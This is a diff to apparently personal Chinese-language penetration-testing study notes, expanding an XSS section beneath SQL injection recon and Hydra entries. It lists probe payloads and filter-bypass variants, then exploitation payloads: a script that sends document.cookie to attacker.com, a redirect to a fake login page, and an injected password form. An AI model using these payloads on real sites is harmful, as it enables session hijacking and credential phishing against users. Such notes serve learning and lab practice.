@@ -62,13 +62,27 @@ SQL injection
 - curl -s "http://metapress.htb" | grep -iE "nonce|bookingpress"
 
 2. XSS -> 使用 BurpSuite 攔截封包
+(1) 直接插入 <script> 標籤（最直接，但也最容易被防火牆擋下）
 - <script>alert(1)</script>
 - <script>alert(document.cookie)</script>
-- <svg/onload=alert(1)>
-- <img src=# onerror=alert(1)>
-- <a href="javascript:alert(1)">g</a>
-- <input type="text" value="g" onmouseover="alert(1)" />
-- <iframe src="javascript:alert(1)"></iframe>
+(2) 利用 HTML 事件屬性（Event Handlers）（常搭配正常的標籤來隱蔽）
+- 當圖片載入失敗時觸發：<img src="x" onerror="alert(1)">
+- 當滑鼠移過去時觸發：<a href="#" onmouseover="alert(1)">
+- 當網頁載入時觸發：<body onload="alert(1)">
+(3) 利用偽協議（Pseudo-protocols）（將 JS 偽裝成網址）
+- 放在超連結中：<a href="javascript:alert(1)">點擊這裡領取獎品</a>
+## 實戰中常見的注入語法與目的
+(1) 探測漏洞（Proof of Concept）-> 目的是證明「這段程式碼確實被瀏覽器執行了」，通常會使用彈出視窗
+- "><script>alert(document.cookie)</script> -> （前面的 "> 用用來閉合原有的 HTML 標籤）
+- <svg/onload=alert(1)> -> （利用 SVG 標籤與 onload 事件，語法極短，常用於繞過長度限制）
+- <ScRipT>alert(1)</sCripT> -> (利用大小寫混寫，繞過寫得很差的正則表達式過濾）
+(2) 實際攻擊利用（Exploitation）-> 一旦確認有漏洞，攻擊者就會把 alert(1) 換成具備殺傷力的 Payload（惡意酬載）
+a. 竊取使用者的 Cookie（Session Hijacking）
+- <script>new Image().src="https://attacker.com/log?cookie=" + document.cookie;</script> -> (解析：在背景偷偷載入一張假圖片，順便把使用者的 Cookie 當作網址參數傳送給駭客的伺服器。)
+b. 網頁重新導向（釣魚網站）
+- <script>window.location.href="https://fake-login-page.com";</script>
+c. 網頁塗鴉 / 釣魚表單
+- <script>document.body.innerHTML="<h1>請重新輸入密碼：</h1><input type='password'>"</script>
 
 3. Hydra -> /usr/share/wordlists
 - SSH
